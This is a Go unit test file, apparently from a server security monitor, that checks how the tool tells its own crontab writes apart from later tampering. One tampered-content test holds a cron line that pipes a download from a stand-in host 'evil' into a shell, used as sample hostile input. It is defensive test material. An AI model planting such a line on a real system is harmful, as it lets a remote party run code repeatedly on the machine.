package checks

import (
	"fmt"
	"sync"
	"testing"
	"time"
)

func withSelfWriteClock(t *testing.T, now func() time.Time) {
	t.Helper()
	selfWriteMu.Lock()
	prev := selfWriteNow
	selfWriteNow = now
	selfWriteMu.Unlock()
	t.Cleanup(func() {
		selfWriteMu.Lock()
		selfWriteNow = prev
		selfWriteMu.Unlock()
	})
}

func resetSelfWrites(t *testing.T) {
	t.Helper()
	selfWriteMu.Lock()
	selfWrites = map[string]selfWriteRecord{}
	selfWriteMu.Unlock()
}

func TestSelfWrite_MatchesRecordedContent(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/alice"
	content := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n")
	RecordSelfWrite(path, content)

	if !isExpectedSelfWrite(path, content) {
		t.Error("identical content within TTL must be recognized as a CSM self-write")
	}
}

func TestSelfWrite_RejectsTamperedContent(t *testing.T) {
	resetSelfWrites(t)
	path := "/var/spool/cron/alice"
	RecordSelfWrite(path, []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n"))

	tampered := []byte("# CSM WP-Cron\n*/5 * * * * php wp-cron.php\n* * * * * curl evil|sh\n")
	if isExpectedSelfWrite(path, tampered) {
		t.Error("content changed after the CSM write must NOT be suppressed (no path allowlist)")
	}
}

func TestSelfWrite_UnknownPath(t *testing.T) {
	resetSelfWrites(t)
	if isExpectedSelfWrite("/var/spool/cron/never-written", []byte("x")) {
		t.Error("a path CSM never wrote must not be expected")
	}
}

func TestSelfWrite_Expires(t *testing.T) {
	resetSelfWrites(t)
	base := time.Unix(1_780_000_000, 0)
	withSelfWriteClock(t, func() time.Time { return base })
	path := "/etc/cron.d/csm"
	content := []byte("0 * * * * root /bin/true\n")
	RecordSelfWrite(path, content)

	// Past the TTL the entry must no longer suppress.
	withSelfWriteClock(t, func() time.Time { return base.Add(selfWriteTTL + time.Second) })
	if isExpectedSelfWrite(path, content) {
		t.Error("expired self-write must not be expected")
	}
}

func TestSelfWrite_PrunesExpiredEntriesOnRecord(t *testing.T) {
	resetSelfWrites(t)
	base := time.Unix(1_780_000_000, 0)
	withSelfWriteClock(t, func() time.Time { return base })
	RecordSelfWrite("/var/spool/cron/old", []byte("old\n"))

	withSelfWriteClock(t, func() time.Time { return base.Add(selfWriteTTL + time.Second) })
	RecordSelfWrite("/var/spool/cron/new", []byte("new\n"))

	selfWriteMu.Lock()
	defer selfWriteMu.Unlock()
	if _, ok := selfWrites["/var/spool/cron/old"]; ok {
		t.Fatal("expired self-write entry survived a later record")
	}
	if _, ok := selfWrites["/var/spool/cron/new"]; !ok {
		t.Fatal("new self-write entry missing after pruning")
	}
}

func TestSelfWrite_ConcurrentRecordAndLookup(t *testing.T) {
	resetSelfWrites(t)
	base := time.Unix(1_780_000_000, 0)
	withSelfWriteClock(t, func() time.Time { return base })

	var wg sync.WaitGroup
	for i := 0; i < 64; i++ {
		i := i
		wg.Add(1)
		go func() {
			defer wg.Done()
			path := fmt.Sprintf("/var/spool/cron/user%d", i)
			content := []byte(fmt.Sprintf("*/5 * * * * php wp-cron-%d.php\n", i))
			RecordSelfWrite(path, content)
			if !isExpectedSelfWrite(path, content) {
				t.Errorf("recorded content for %s was not recognized", path)
			}
		}()
	}
	wg.Wait()
}
